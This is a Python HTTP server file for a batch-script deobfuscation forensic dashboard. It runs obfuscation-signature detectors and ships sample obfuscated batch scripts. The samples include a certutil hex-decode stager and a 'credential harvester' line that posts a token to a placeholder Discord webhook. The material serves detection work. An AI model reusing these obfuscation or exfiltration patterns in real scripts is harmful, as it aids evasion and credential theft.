"""
HTTP REST Server for Batch Deobfuscator Real-Time Forensic Dashboard.
Implements non-blocking ThreadingHTTPServer with real-time entropy profiling,
18-engine signature telemetry, CCCS Assemblyline trait mapping, and zero external dependencies.
Part of batch-deobfuscator security toolchain.
"""

import json
import os
import sys
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, Any, Optional, Tuple

from . import __version__
from .core import BatchDeobfuscator
from .diff import generate_unified_diff
from .entropy_heatmap import (
    analyze_entropy_profile,
    zeroize_dict,
    zeroize_bytes,
)
from .dashboard_assets import get_dashboard_html

# Specialized engine signature detectors
from .batcloak import detect_batcloak_signatures
from .somalifuscator import detect_somalifuscator_signatures
from .oxidizer import detect_oxidizer_signatures
from .abobus import detect_abobus_signatures
from .dosfuscation import detect_dosfuscation_signatures
from .cradlecrafter import detect_cradle_signatures
from .bedecode import detect_bedecode_signatures
from .batchshield import detect_batchshield_signatures
from .pandacrypter import detect_pandacrypter_signatures
from .exorcism import detect_exorcism_signatures
from .batchtoapp import detect_batchtoapp_signatures
from .machine1337 import detect_machine1337_signatures
from .cmd_deobfuscator import detect_cmd_deobfuscator_signatures
from .simple_obfuscator import detect_simple_obfuscator_signatures
from .jsbatch import detect_jsbatch_signatures
from .batchstealer import detect_batchstealer_signatures
from .wirebits import detect_wirebits_signatures
from .assemblyline import extract_batch_traits, CCCS_HEURISTICS


# Built-in sample corpora presets for one-click UI evaluation
BUILTIN_SAMPLES: Dict[str, Dict[str, str]] = {
    "BatCloak": {
        "name": "BatCloak %RANDOM% & Header Juggling",
        "script": (
            "&cls\r\n"
            "@echo off\r\n"
            "set %RANDOM%=dummy\r\n"
            "set a1=c^m^d\r\n"
            "set a2=/c wh^o^a^m^i\r\n"
            "%a1% %a2%\r\n"
        ),
    },
    "0xidiz3r": {
        "name": "0xidiz3r Zero-Literal Bootstrap Substitution",
        "script": (
            "@echo off\r\n"
            "set a=set\r\n"
            "set b= \r\n"
            "set c==\r\n"
            "%a%%b%cmd%c%whoami\r\n"
            "cmd /c %cmd%\r\n"
        ),
    },
    "Somalifuscator": {
        "name": "Somalifuscator Caesar Scrambler & Loop",
        "script": (
            "@echo off\r\n"
            "set KDOT=a b c d e f g h i j k l m n o p q r s t u v w x y z\r\n"
            "set payload=c m d\r\n"
            "for /l %%i in (1,1,3) do set run=cmd /c whoami\r\n"
            "%run%\r\n"
        ),
    },
    "Abobus": {
        "name": "Abobus Unicode Noise & Caret Trap",
        "script": (
            "@echo off\r\n"
            "set \"_trap=ヾ(⌐■_■)ノ\"\r\n"
            "s^e^t a=c^m^d\r\n"
            "s^e^t b=/^c\r\n"
            "s^e^t c=w^h^o^a^m^i\r\n"
            "%a% %b% %c%\r\n"
        ),
    },
    "DOSfuscation": {
        "name": "Invoke-DOSfuscation Bohannon Slicing",
        "script": (
            "@echo off\r\n"
            "set _p=ProgramFiles\r\n"
            "set _cmd=%_p:~0,1%md /c whoami\r\n"
            "c%_cmd:~1%\r\n"
        ),
    },
    "PandaCrypter": {
        "name": "PandaCrypter Colon Padding & Certutil Hex",
        "script": (
            ":::: PandaCrypter Stager\r\n"
            "@echo off\r\n"
            "echo 63 6d 64 20 2f 63 20 77 68 6f 61 6d 69 > stage.hex\r\n"
            "certutil -decodehex stage.hex stage.bat\r\n"
            "call stage.bat\r\n"
        ),
    },
    "BatchStealer": {
        "name": "BatchStealer Credential Harvester",
        "script": (
            "@echo off\r\n"
            "set WH=https://discord.com/api/webhooks/1234567890/token_here\r\n"
            "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"token\\\"}\" %WH%\r\n"
            "cmd /c whoami\r\n"
        ),
    },
    "WireBits": {
        "name": "BatchObfuscator-wirebits Hex Escape & Chars",
        "script": (
            "@echo off\r\n"
            "set c1=c\r\n"
            "set c2=m\r\n"
            "set c3=d\r\n"
            "%c1%%c2%%c3% /c whoami\r\n"
        ),
    },
}


def run_all_detectors(script: str) -> Dict[str, Any]:
    """Execute all 18+ specialized obfuscation signature detectors."""
    detections: Dict[str, Any] = {
        "batcloak": {
            "name": "BatCloak Normalizer",
            "detected": detect_batcloak_signatures(script),
            "description": "%RANDOM% noise, junk header obfuscation, dead stores",
            "mitre_technique": "T1027.001",
        },
        "somalifuscator": {
            "name": "Somalifuscator Caesar Inverter",
            "detected": detect_somalifuscator_signatures(script),
            "description": "Alphabet rotation, KDOT array slicing, for /l unwrapping",
            "mitre_technique": "T1027.002",
        },
        "oxidizer": {
            "name": "0xidiz3r Zero-Literal Bootstrap",
            "detected": detect_oxidizer_signatures(script),
            "description": "SET/SPACE/EQUALS primitive extraction, dynamic alphabet",
            "mitre_technique": "T1027.001",
        },
        "abobus": {
            "name": "Abobus Unicode Normalizer",
            "detected": detect_abobus_signatures(script),
            "description": "Zero-width characters, Kaomoji chaff, caret fragmentation",
            "mitre_technique": "T1027.001",
        },
        "dosfuscation": {
            "name": "Invoke-DOSfuscation Bohannon",
            "detected": detect_dosfuscation_signatures(script),
            "description": "Out-DosReversedCommand, Bohannon environment slicing",
            "mitre_technique": "T1059.003",
        },
        "cradlecrafter": {
            "name": "Invoke-CradleCrafter Stager",
            "detected": detect_cradle_signatures(script),
            "description": "PowerShell Base64 UTF-16LE download cradle detection",
            "mitre_technique": "T1059.001",
        },
        "bedecode": {
            "name": "Batch-Encryption-DeCoder (BEDeCode)",
            "detected": detect_bedecode_signatures(script),
            "description": "Self-extracting runtime stub, nested onion layers",
            "mitre_technique": "T1027.002",
        },
        "batchshield": {
            "name": "BatchShield Symbol Resolver",
            "detected": detect_batchshield_signatures(script),
            "description": "Virtual symbol tables, compound environment variable chains",
            "mitre_technique": "T1027.001",
        },
        "pandacrypter": {
            "name": "PandaCrypter & Certutil Stager",
            "detected": detect_pandacrypter_signatures(script),
            "description": "Colon padding, Certutil -decode / -decodehex payload staging",
            "mitre_technique": "T1140",
        },
        "exorcism": {
            "name": "Exorcism Control Flow Flattener",
            "detected": detect_exorcism_signatures(script),
            "description": "Opaque predicates, unconditional goto trampoline hopping",
            "mitre_technique": "T1027.004",
        },
        "batchtoapp": {
            "name": "BatchToApp / DosX Wrapper",
            "detected": detect_batchtoapp_signatures(script),
            "description": "PE Deflate resource embedding, operator variable mapping",
            "mitre_technique": "T1027.001",
        },
        "machine1337": {
            "name": "batobfuscate-machine1337 Header",
            "detected": detect_machine1337_signatures(script),
            "description": "Multi-BOM fake headers, CJK transcode recovery",
            "mitre_technique": "T1027.001",
        },
        "cmd_deobfuscator": {
            "name": "CMD-DeObfuscator Graph Solver",
            "detected": detect_cmd_deobfuscator_signatures(script),
            "description": "Chained variable dependency graphs, quote widening",
            "mitre_technique": "T1027.001",
        },
        "simple_obfuscator": {
            "name": "simple-batch-obfuscator Filter",
            "detected": detect_simple_obfuscator_signatures(script),
            "description": "Character-level variable noise, dynamic set aliases",
            "mitre_technique": "T1027.001",
        },
        "jsbatch": {
            "name": "JSBatch Polyglot Extractor",
            "detected": detect_jsbatch_signatures(script),
            "description": "Hybrid JScript/BAT stubs, conditional compilation blocks",
            "mitre_technique": "T1059.007",
        },
        "batchstealer": {
            "name": "BatchStealer Forensics & Defanger",
            "detected": detect_batchstealer_signatures(script),
            "description": "Discord webhook / Telegram C2 exfiltration extraction",
            "mitre_technique": "T1552.001",
        },
        "wirebits": {
            "name": "BatchObfuscator-wirebits Decoder",
            "detected": detect_wirebits_signatures(script),
            "description": "Hex/octal escapes, PowerShell array casting, char splicing",
            "mitre_technique": "T1027.001",
        },
    }
    return detections


class DashboardApiHandler(BaseHTTPRequestHandler):
    """Custom request handler servicing REST API endpoints and static SPA assets."""

    def log_message(self, format: str, *args: Any) -> None:
        """Silence standard console logging to keep terminal output clean."""
        pass

    def send_json(self, data: Any, status: int = 200) -> None:
        """Send a JSON response with UTF-8 encoding and security headers."""
        body = json.dumps(data, indent=2).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self) -> None:
        """Handle pre-flight CORS requests."""
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self) -> None:
        """Handle GET requests for dashboard HTML, health check, heuristics, and samples."""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/" or path == "/index.html":
            html = get_dashboard_html(version=__version__).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(html)))
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            self.wfile.write(html)
            return

        if path == "/api/health":
            self.send_json({
                "status": "ok",
                "version": __version__,
                "engines_count": 18,
                "cccs_ready": True,
            })
            return

        if path == "/api/heuristics":
            heuristics_list = []
            for h_id, h in CCCS_HEURISTICS.items():
                heuristics_list.append({
                    "id": h_id,
                    "name": h.get("name", ""),
                    "description": h.get("name", ""),
                    "score": h.get("score", 0),
                    "attack_ids": h.get("attack_ids", []),
                })
            self.send_json({
                "version": __version__,
                "heuristics": heuristics_list,
            })
            return

        if path == "/api/samples":
            sample_index = [
                {"id": k, "name": v["name"]}
                for k, v in BUILTIN_SAMPLES.items()
            ]
            self.send_json({"samples": sample_index})
            return

        if path.startswith("/api/samples/"):
            sample_id = urllib.parse.unquote(path[len("/api/samples/"):])
            if sample_id in BUILTIN_SAMPLES:
                sample_data = BUILTIN_SAMPLES[sample_id]
                self.send_json({
                    "id": sample_id,
                    "name": sample_data["name"],
                    "script": sample_data["script"],
                })
            else:
                self.send_json({"error": "Sample not found"}, status=404)
            return

        self.send_json({"error": "Not found"}, status=404)

    def do_POST(self) -> None:
        """Handle POST requests for real-time analysis, deobfuscation, and exporting."""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        # Enforce maximum payload size (20 MB)
        content_length_str = self.headers.get("Content-Length", "0")
        try:
            content_length = int(content_length_str)
        except ValueError:
            self.send_json({"error": "Invalid Content-Length"}, status=400)
            return

        if content_length > 20 * 1024 * 1024:
            self.send_json({"error": "Payload Too Large (>20MB)"}, status=413)
            return

        raw_body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        try:
            req_data = json.loads(raw_body) if raw_body else {}
        except Exception as e:
            self.send_json({"error": f"Invalid JSON body: {str(e)}"}, status=400)
            return

        script = req_data.get("script", "")

        if path == "/api/analyze":
            entropy_profile = analyze_entropy_profile(script)
            detections = run_all_detectors(script)
            empty_meta: Dict[str, Any] = {"passes_executed": 0, "symbols_resolved": []}
            raw_traits = extract_batch_traits(script, script, empty_meta)

            cccs_traits = []
            for t_name, t_val in raw_traits.items():
                cccs_traits.append({
                    "name": t_name,
                    "score": 10 if t_val else 0,
                    "description": f"CCCS Trait: {t_name}",
                    "pattern": str(t_val)[:80],
                })

            response = {
                "entropy": entropy_profile,
                "detections": detections,
                "cccs_traits": cccs_traits,
            }
            self.send_json(response)
            zeroize_dict(response)
            return

        if path == "/api/deobfuscate":
            passes = int(req_data.get("passes", 15))
            passes = max(1, min(passes, 50))

            deobfuscator = BatchDeobfuscator(max_passes=passes)
            clean_script, meta = deobfuscator.deobfuscate(script)

            entropy_profile = analyze_entropy_profile(script, clean_script=clean_script)
            diff_text = generate_unified_diff(
                script,
                clean_script,
                filename="script.bat",
                use_color=False
            )
            detections = run_all_detectors(script)
            raw_traits = extract_batch_traits(script, clean_script, meta)

            cccs_traits = []
            for t_name, t_val in raw_traits.items():
                cccs_traits.append({
                    "name": t_name,
                    "score": 10 if t_val else 0,
                    "description": f"CCCS Trait: {t_name}",
                    "pattern": str(t_val)[:80],
                })

            response = {
                "deobfuscated_script": clean_script,
                "diff": diff_text,
                "entropy": entropy_profile,
                "meta": meta,
                "detections": detections,
                "cccs_traits": cccs_traits,
            }
            self.send_json(response)
            zeroize_dict(response)
            return

        self.send_json({"error": "Unknown POST endpoint"}, status=404)


def create_dashboard_server(
    host: str = "127.0.0.1",
    port: int = 8080
) -> ThreadingHTTPServer:
    """Create and configure a ThreadingHTTPServer instance for the dashboard."""
    server_address = (host, port)
    server = ThreadingHTTPServer(server_address, DashboardApiHandler)
    return server


def start_dashboard_background(
    host: str = "127.0.0.1",
    port: int = 8080
) -> Tuple[ThreadingHTTPServer, threading.Thread, str]:
    """
    Launch the web dashboard server in a background daemon thread.
    Returns (server_instance, thread, server_url).
    """
    server = create_dashboard_server(host, port)
    actual_port = server.server_port
    url = f"http://{host}:{actual_port}"

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread, url


def run_dashboard(
    host: str = "127.0.0.1",
    port: int = 8080,
    open_browser: bool = False
) -> None:
    """
    Run the web dashboard in blocking mode on the current thread.
    Opens the default web browser if open_browser is True.
    """
    server = create_dashboard_server(host, port)
    actual_port = server.server_port
    url = f"http://{host}:{actual_port}"

    print(f"[*] batch-deobfuscator Forensic Dashboard v{__version__}")
    print(f"[*] Server listening on {url}")
    print("[*] 18 specialized detection engines active. Press Ctrl+C to terminate.")

    if open_browser:
        try:
            import webbrowser
            webbrowser.open(url)
        except Exception:
            pass

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down dashboard server...")
    finally:
        server.server_close()
